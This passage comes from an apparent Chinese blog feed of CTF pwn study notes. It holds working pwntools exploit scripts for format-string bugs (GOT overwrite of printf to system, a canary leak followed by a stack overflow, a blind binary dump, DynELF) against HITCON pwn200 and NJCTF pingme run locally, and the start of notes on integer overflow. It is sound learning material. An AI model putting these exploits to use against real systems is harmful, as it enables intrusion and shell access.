class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span>(<span class="params">payload</span>):</span><span class="comment"># 与服务器交互的函数</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    info = io.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto = FmtStr(exec_fmt)<span class="comment"># 在初始化的时候就计算出了offset，假如输入AAAA，则offset的含义就是AAAA在可变参数中第几个，即%&#123;offset&#125;$s</span></span><br><span class="line">offset = auto.offset           </span><br><span class="line"></span><br><span class="line"><span class="comment"># print(offset)</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = p32(printf_got) + <span class="string">&#x27;%&#123;&#125;$s&#x27;</span>.<span class="built_in">format</span>(offset).encode(<span class="string">&#x27;ascii&#x27;</span>)<span class="comment"># 获取printf_got这个地址的数据，即printf的地址</span></span><br><span class="line">io.send(payload)</span><br><span class="line">printf_addr = u32(io.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_address = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_addr = libc_address + libc.symbols[<span class="string">&#x27;system&#x27;</span>]<span class="comment"># 根据偏移获取system的地址</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;system_addr : %s&quot;</span> % <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got : system_addr&#125;)<span class="comment"># 将printf_got这个地址处的数据改为system_addr</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">&#x27;/bin/sh&#x27;</span>)<span class="comment"># 此时printf已经改为了system，发送/bin/sh获取shell</span></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="HITCON-CMT-2017-pwn200"><a href="#HITCON-CMT-2017-pwn200" class="headerlink" title="HITCON CMT 2017: pwn200"></a>HITCON CMT 2017: pwn200</h2><p>本题没有从网上找到附件，因为书上给了源码，直接手动编译下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">canary_protect_me</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    gets(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -z noexecstack -no-pie pwn200.c -o pwn200.c</span><br></pre></td></tr></table></figure><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220326112206680.png" class="" title="image-20220326112206680"><p>程序开启了Canary，而程序也留有1个后门canary_protect_me，所以我们通过格式化漏洞泄露出canary的值，然后再栈溢出漏洞覆盖掉返回值</p><img src="/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20220326202300940.png" class="" title="image-20220326202300940"><p>因为最后这里，esp = [ebp-4]-4, 所以我们要知道ebp的值，然后+4，填到这个位置。（这也导致了下面的EXP和书上的有所不同</p><p>搭建pwn环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup socat tcp4-listen:10001,reuseaddr,fork <span class="built_in">exec</span>:./pwn200 &amp;</span><br></pre></td></tr></table></figure><p>EXP为:  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x8048566</span></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn200&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;%15$x&quot;</span></span><br><span class="line">ebp = <span class="number">0xffffcf98</span><span class="comment"># 通过调试得到 &quot;%17$x&quot;得到的数 - 24 就是EBP的值，所以多次尝试，发现%17$x的值一样</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv().decode(), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;canary: &quot;</span>+ <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>* <span class="number">40</span> + p32(canary) + <span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span> +  p32(ebp+<span class="number">4</span>)+ p32(backdoor)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>这里写上了EBP的地址，但我知道其实做法肯定是不对的，玩意ebp每次都变，那么将无解，所以正确的做法这里我也不会，(以后碰到了有同种类型的题再研究</p></blockquote><h2 id="NJCTF2017-pingme"><a href="#NJCTF2017-pingme" class="headerlink" title="NJCTF2017: pingme"></a>NJCTF2017: pingme</h2><p>本题没有给出二进制文件，但是通过输入输出猜测是格式化字符串漏洞，可以无限利用漏洞，于是先把程序dump下来</p><p>搭建本地环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup socat tcp4-listen:10001,reuseaddr,fork <span class="built_in">exec</span>:./pingme &amp;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span>(<span class="params">payload</span>):</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    info = io.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_memory</span>(<span class="params">start_addr, end_addr</span>):</span></span><br><span class="line">    result = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> start_addr &lt; end_addr:</span><br><span class="line">        io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">        io.recvline()</span><br><span class="line">        payload = <span class="string">b&quot;%9$s.AAA&quot;</span> + p32(start_addr)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        data = io.recvuntil(<span class="string">b&#x27;.AAA&#x27;</span>)[:-<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&quot;&quot;</span>:    </span><br><span class="line">            data = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">        log.info(<span class="string">&quot;leaking: &#123;0&#125; --- &gt; &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(start_addr), data))</span><br><span class="line">        result += data</span><br><span class="line">        start_addr += <span class="built_in">len</span>(data)</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">auto = FmtStr(exec_fmt)</span><br><span class="line">offset = auto.offset</span><br><span class="line"><span class="built_in">print</span>(offset)<span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x8048000</span></span><br><span class="line">end_addr = <span class="number">0x8049000</span></span><br><span class="line">code_bin = dump_memory(start_addr, end_addr)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;code.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(code_bin)</span><br></pre></td></tr></table></figure><p>成功将程序dump下来，思路是将printf的地址修改为system的地址，然后输入/bin/sh获取shell</p><p>对于获取libc的基地址以及system函数的地址有2种方法，第一种方法是泄露出printf函数的地址，然后根据此地址去libc-database去查询，第二种方法用DynELF来获取system的地址，这里第一种方法失败了，不知道为啥，这里先记录下（假设能成功。。。。能以后了解的多了再回来解决这个问题</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>先查询got表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">readelf -r code.bin </span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.dyn&#x27;</span> at offset 0x35c contains 3 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049960  00000606 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line">080499a0  00000d05 R_386_COPY        080499a0   stdin@GLIBC_2.0</span><br><span class="line">080499a4  00000b05 R_386_COPY        080499a4   stdout@GLIBC_2.0</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.plt&#x27;</span> at offset 0x374 contains 9 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049970  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0</span><br><span class="line">08049974  00000207 R_386_JUMP_SLOT   00000000   <span class="built_in">printf</span>@GLIBC_2.0</span><br><span class="line">08049978  00000307 R_386_JUMP_SLOT   00000000   fgets@GLIBC_2.0</span><br><span class="line">0804997c  00000407 R_386_JUMP_SLOT   00000000   alarm@GLIBC_2.0</span><br><span class="line">08049980  00000507 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0</span><br><span class="line">08049984  00000707 R_386_JUMP_SLOT   00000000   strchr@GLIBC_2.0</span><br><span class="line">08049988  00000807 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0</span><br><span class="line">0804998c  00000907 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">08049990  00000a07 R_386_JUMP_SLOT   00000000   putchar@GLIBC_2.0</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span>(<span class="params">payload</span>):</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    info = io.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">method_1</span>(<span class="params">printf_addr</span>):</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    libc_addr = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;libc_addr: %#x&quot;</span> % libc_addr)</span><br><span class="line">    system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;system_addr: %#x&quot;</span> % system_addr)</span><br><span class="line">    <span class="keyword">return</span> system_addr</span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x08049974</span></span><br><span class="line">payload = <span class="string">b&quot;%9$s.AAA&quot;</span> + p32(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">data = io.recvuntil(<span class="string">b&#x27;.AAA&#x27;</span>)[:<span class="number">4</span>]</span><br><span class="line">printf_addr = u32(data)</span><br><span class="line">log.info(<span class="string">&quot;printf_addr: %#x&quot;</span> % printf_addr)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xf7e2d520</span></span><br></pre></td></tr></table></figure><p>可以得到printf的地址是0xf7e2d520 ，然后拿着这个地址和printf去Libc-database去搜，但是我没搜到。。。。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">╭─ ~/Desktop/testC/fmt_test                                                                                                               </span><br><span class="line">╰─ uname -a</span><br><span class="line">Linux ubuntu 5.4.0-104-generic <span class="comment">#118~18.04.1-Ubuntu SMP Thu Mar 3 13:53:15 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">╭─ ~/Desktop/testC/fmt_test                                                                                                           </span><br><span class="line">╰─ ldd code.bin </span><br><span class="line">linux-gate.so.1 (0xf7fd5000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7ddc000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7fd6000)</span><br><span class="line"></span><br><span class="line">╭─ ~/Desktop/testC/fmt_test                                                                                                              </span><br><span class="line">╰─ ls -l /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">lrwxrwxrwx 1 root root 12 1月  24 20:53 /lib/i386-linux-gnu/libc.so.6 -&gt; libc-2.27.so</span><br></pre></td></tr></table></figure><p>我的虚拟机环境是这样</p><p>只能假设搜到了这个libc，然后再获取system的地址覆盖就OK了</p><p>EXP为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span>(<span class="params">payload</span>):</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    info = io.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">method_1</span>(<span class="params">printf_addr</span>):</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    libc_addr = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;libc_addr: %#x&quot;</span> % libc_addr)</span><br><span class="line">    system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;system_addr: %#x&quot;</span> % system_addr)</span><br><span class="line">    <span class="keyword">return</span> system_addr</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">auto = FmtStr(exec_fmt)</span><br><span class="line">offset = auto.offset</span><br><span class="line"><span class="built_in">print</span>(offset)</span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x08049974</span></span><br><span class="line">payload = <span class="string">b&quot;%9$s.AAA&quot;</span> + p32(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">data = io.recvuntil(<span class="string">b&#x27;.AAA&#x27;</span>)[:<span class="number">4</span>]</span><br><span class="line">printf_addr = u32(data)</span><br><span class="line">log.info(<span class="string">&quot;printf_addr: %#x&quot;</span> % printf_addr)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">system_addr = method_1(printf_addr)</span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got: system_addr&#125;, write_size=<span class="string">&#x27;short&#x27;</span>)<span class="comment"># 这个地方要注意一下，题目限制了payload的长度，所以把write_size从byte改为short就可以缩短payload的长度</span></span><br><span class="line">log.info(<span class="string">&quot;len_payload : &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span>(<span class="params">payload</span>):</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    info = io.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    io.recvline()</span><br><span class="line">    payload = <span class="string">b&#x27;%9$s.AAA&#x27;</span> + p32(addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    data = io.recvuntil(<span class="string">b&#x27;.AAA&#x27;</span>)[:-<span class="number">4</span>] + <span class="string">b&#x27;\x00&#x27;</span> <span class="comment"># \x00 字符串结尾</span></span><br><span class="line">    log.info(<span class="string">&#x27;leaking: &#123;0&#125;: &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr), hexlify(data)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x08049974</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data = DynELF(leak, elf=ELF(&quot;./code.bin&quot;))</span></span><br><span class="line">data = DynELF(leak, <span class="number">0x08048490</span>)</span><br><span class="line">system_addr = data.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;ststem_addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;printf_got: system_addr&#125;, write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;len_payload : &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 读书笔记 </tag>
            
            <tag> 《CTF竞赛权威指南-pwn篇》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第8章_整数安全</title>
      <link href="/2022/03/24/%E7%AC%AC8%E7%AB%A0_%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/"/>
      <url>/2022/03/24/%E7%AC%AC8%E7%AB%A0_%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引等，就会存在潜在的危险，通常情况下，整数溢出并没有改写额外的内存，不会导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者会导致任意代码执行。</p><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>异常情况主要是3种</p><ol><li><p>溢出，只有有符号数才会发生溢出，溢出标志OF可检测有符号数的溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">i = INT_MAX;<span class="comment">//2147483647</span></span><br><span class="line">i++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i=%d\n&quot;</span>, i);     <span class="comment">//   -2147483648</span></span><br></pre></td></tr></table></figure></li><li><p>回绕，无符号数会发生回绕，溢出标志CF可检测无符号数的溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ui;</span><br><span class="line">ui = UINT_MAX;   <span class="comment">//在x86-32上，为4294967295</span></span><br><span class="line">ui++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ui=%d\n&quot;</span>, ui);<span class="comment">//ui=0</span></span><br></pre></td></tr></table></figure></li><li><p>截断，将较大宽度的数存入一个宽度小的操作数中，高位发生截断</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> a = <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> b = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> c = a + b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#x\n&quot;</span>, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//0xffffd000</span></span><br><span class="line"><span class="comment">//0                                                                       </span></span><br></pre></td></tr></table></figure><h2 id="漏洞多发函数"><a href="#漏洞多发函数" class="headerlink" title="漏洞多发函数"></a>漏洞多发函数</h2><p>整数溢出要配合其他类型的缺陷才能够有用，下面的两个函数都有一个size_t类型的参数，尝尝被误用而造成整数溢出，接着就可能导致缓冲区溢出漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">memcpy</span><span class="params">(<span class="keyword">void</span> * dest, <span class="keyword">const</span> <span class="keyword">void</span> * src, <span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">strncpy</span><span class="params">(<span class="keyword">char</span> * dest, <span 